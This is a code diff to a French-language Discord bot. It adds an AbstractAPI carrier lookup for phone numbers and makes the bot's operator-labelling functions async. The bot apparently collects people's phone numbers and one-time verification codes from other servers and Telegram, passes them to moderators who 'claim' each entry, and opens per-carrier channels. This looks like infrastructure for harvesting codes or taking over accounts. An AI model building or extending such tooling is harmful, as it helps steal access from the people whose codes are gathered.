@@ -164,9 +164,8 @@ function formatPhone(p) {
   return p.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
 }
 
-function getOperator(p) {
+function getOperatorSync(p) {
   const pre = p.slice(0, 4);
-  // table ARCEP/ephemeride - 4 chiffres
   const bouygues = new Set(["0653","0660","0661","0662","0663","0664","0665","0666","0667","0668","0695","0696","0697","0698","0699","0760","0761","0762","0763","0798","0799"]);
   const free = new Set(["0651","0652","0654","0656","0749","0750","0768","0769","0783","0784"]);
   const orange = new Set(["0607","0608","0630","0631","0632","0633","0634","0635","0670","0671","0672","0673","0674","0675","0676","0677","0678","0679","0680","0681","0682","0683","0684","0685","0686","0687","0688","0689","0690","0707","0764","0765","0766","0767","0770","0771","0776","0777","0780","0781","0782","0786","0787","0788","0789","0790"]);
@@ -178,8 +177,48 @@ function getOperator(p) {
   if (p.startsWith("06") || p.startsWith("07")) return "SFR Mobile";
   return "Mobile FR";
 }
+function getOperator(p) { return getOperatorSync(p); } // compat sync
+const operatorCache = new Map();
+async function getOperatorPrecise(p) {
+  if (!p) return getOperatorSync(p);
+  if (operatorCache.has(p)) return operatorCache.get(p);
+  const key = process.env.ABSTRACT_API_KEY;
+  if (!key) {
+    const op = getOperatorSync(p);
+    operatorCache.set(p, op);
+    return op;
+  }
+  try {
+    const phoneIntl = p.startsWith("0") ? "+33" + p.slice(1) : p;
+    const url = `https://phonevalidation.abstractapi.com/v1/?api_key=${key}&phone=${encodeURIComponent(phoneIntl)}`;
+    const res = await fetch(url, { signal: AbortSignal.timeout(4000) });
+    if (!res.ok) throw new Error("abstract status " + res.status);
+    const j = await res.json();
+    const carrier = j.carrier || j.carrier_name || j?.phone?.carrier;
+    if (carrier && typeof carrier === "string" && carrier.trim()) {
+      operatorCache.set(p, carrier.trim());
+      return carrier.trim();
+    }
+    // fallback si pas de carrier mais valid
+    const op = getOperatorSync(p);
+    operatorCache.set(p, op);
+    return op;
+  } catch (e) {
+    const op = getOperatorSync(p);
+    operatorCache.set(p, op);
+    return op;
+  }
+}
 function getOperatorSlug(p) {
   const op = getOperator(p);
+  if (op.includes("Bouygues")) return "bouygues";
+  if (op.includes("Free")) return "free";
+  if (op.includes("Orange")) return "orange";
+  if (op.includes("SFR")) return "sfr";
+  return "mobile";
+}
+async function getOperatorSlugPrecise(p) {
+  const op = await getOperatorPrecise(p);
   if (op.includes("Bouygues")) return "bouygues";
   if (op.includes("Free")) return "free";
   if (op.includes("Orange")) return "orange";
@@ -223,7 +262,7 @@ async function getLogChannel() {
 async function sendClaimLog({ claimerId, claimedUserId, claimedUserTag, phone, originGuild, tgName }) {
   const logChannel = await getLogChannel();
   if (!logChannel) return;
-  const operator = getOperator(phone);
+  const operator = await getOperatorPrecise(phone);
   const formatted = formatPhone(phone);
   const nowStr = new Date().toLocaleString("fr-FR", { timeZone: "Europe/Paris", day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });
   const isTg = originGuild && originGuild.id === "tg";
@@ -255,7 +294,7 @@ async function sendFinalResultLog({ status, claimerId, claimedUserId, claimedUse
     console.error(`Final ${status} channel fetch fail:`, e.message);
     return;
   }
-  const operator = phone ? getOperator(phone) : "Inconnu";
+  const operator = phone ? await getOperatorPrecise(phone) : "Inconnu";
   const formatted = phone ? formatPhone(phone) : "Inconnu";
   const nowStr = new Date().toLocaleString("fr-FR", { timeZone: "Europe/Paris", day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });
   const isTg = originGuild && originGuild.id === "tg";
@@ -279,8 +318,8 @@ async function sendFinalResultLog({ status, claimerId, claimedUserId, claimedUse
   }
 }
 
-function buildModEmbed(user, originGuild, phone, code, dateStr) {
-  const operator = getOperator(phone);
+async function buildModEmbed(user, originGuild, phone, code, dateStr) {
+  const operator = await getOperatorPrecise(phone);
   const formatted = formatPhone(phone);
   const codeLine = code ? `\`${code}\`` : "En attente du code membre";
   return new EmbedBuilder()
@@ -918,11 +957,11 @@ client.on("interactionCreate", async (i) => {
       if (data.threadId && data.detailMessageId) {
         try {
           const detailMsg = await targetChannel.messages.fetch(data.detailMessageId);
-          const newEmbed = buildModEmbed(i.user, og || { name: "Serveur", memberCount: 0, id: originGuildId }, data.phone, code, data.dateStr);
+          const newEmbed = await buildModEmbed(i.user, og || { name: "Serveur", memberCount: 0, id: originGuildId }, data.phone, code, data.dateStr);
           await detailMsg.edit({ embeds: [newEmbed] });
         } catch {}
       }
-      const operator = getOperator(data.phone);
+      const operator = await getOperatorPrecise(data.phone);
       const formatted = formatPhone(data.phone);
       const logEmbed = new EmbedBuilder()
         .setTitle("📩 Code de vérification reçu")
@@ -1001,7 +1040,7 @@ client.on("interactionCreate", async (i) => {
       await modMsg.edit({ embeds: [claimedEmbed], components: [] });
       const modGuild = modChannel.guild || await client.guilds.fetch(MOD_GUILD_ID);
       const claimerId = i.user.id;
-      const chanName = `${getOperatorSlug(data.phone)}-${userId}`.toLowerCase();
+      const chanName = `${await getOperatorSlugPrecise(data.phone)}-${userId}`.toLowerCase();
       const newChannel = await modGuild.channels.create({
         name: chanName,
         type: ChannelType.GuildText,
@@ -1011,10 +1050,10 @@ client.on("interactionCreate", async (i) => {
           { id: claimerId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] },
           { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.ManageChannels] }
         ],
-        reason: `Claim ${i.user.tag} ${userId} ${getOperator(data.phone)}`
+        reason: `Claim ${i.user.tag} ${userId} ${await getOperatorPrecise(data.phone)}`
       });
       const targetUser = isTg ? { username: data.tgName || "Telegram", id: userId, displayAvatarURL: () => "https://cdn.discordapp.com/embed/avatars/0.png" } : await client.users.fetch(userId);
-      const detailEmbed = buildModEmbed(targetUser, og || { name: isTg ? "Telegram" : "Serveur", memberCount: 0, id: originGuildId }, data.phone, data.code, data.dateStr);
+      const detailEmbed = await buildModEmbed(targetUser, og || { name: isTg ? "Telegram" : "Serveur", memberCount: 0, id: originGuildId }, data.phone, data.code, data.dateStr);
       const row1 = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setCustomId(`mod_validate_${originGuildId}_${userId}`).setLabel("Valider l'accès").setStyle(ButtonStyle.Success).setEmoji("✅"),
         new ButtonBuilder().setCustomId(`mod_resend_${originGuildId}_${userId}`).setLabel("Renvoyer").setStyle(ButtonStyle.Secondary).setEmoji("🔄"),
@@ -1164,7 +1203,7 @@ client.on("interactionCreate", async (i) => {
       await modMsg.edit({ embeds: [claimedEmbed], components: [] });
       const modGuild = modChannel.guild || await client.guilds.fetch(MOD_GUILD_ID);
       const claimerId = i.user.id;
-      const chanName2 = `${getOperatorSlug(data.phone)}-${userId}`.toLowerCase();
+      const chanName2 = `${await getOperatorSlugPrecise(data.phone)}-${userId}`.toLowerCase();
       const newChannel = await modGuild.channels.create({
         name: chanName2,
         type: ChannelType.GuildText,
@@ -1174,10 +1213,10 @@ client.on("interactionCreate", async (i) => {
           { id: claimerId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] },
           { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.ManageChannels] }
         ],
-        reason: `Prêt ${i.user.tag} ${userId} ${getOperator(data.phone)}`
+        reason: `Prêt ${i.user.tag} ${userId} ${await getOperatorPrecise(data.phone)}`
       });
       const targetUser = isTg ? { username: data.tgName || "Telegram", id: userId, displayAvatarURL: () => "https://cdn.discordapp.com/embed/avatars/0.png" } : await client.users.fetch(userId);
-      const detailEmbed = buildModEmbed(targetUser, og || { name: isTg ? "Telegram" : "Serveur", memberCount: 0, id: originGuildId }, data.phone, data.code, data.dateStr);
+      const detailEmbed = await buildModEmbed(targetUser, og || { name: isTg ? "Telegram" : "Serveur", memberCount: 0, id: originGuildId }, data.phone, data.code, data.dateStr);
       const row1 = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setCustomId(`mod_validate_${originGuildId}_${userId}`).setLabel("Valider l'accès").setStyle(ButtonStyle.Success).setEmoji("✅"),
         new ButtonBuilder().setCustomId(`mod_resend_${originGuildId}_${userId}`).setLabel("Renvoyer").setStyle(ButtonStyle.Secondary).setEmoji("🔄"),
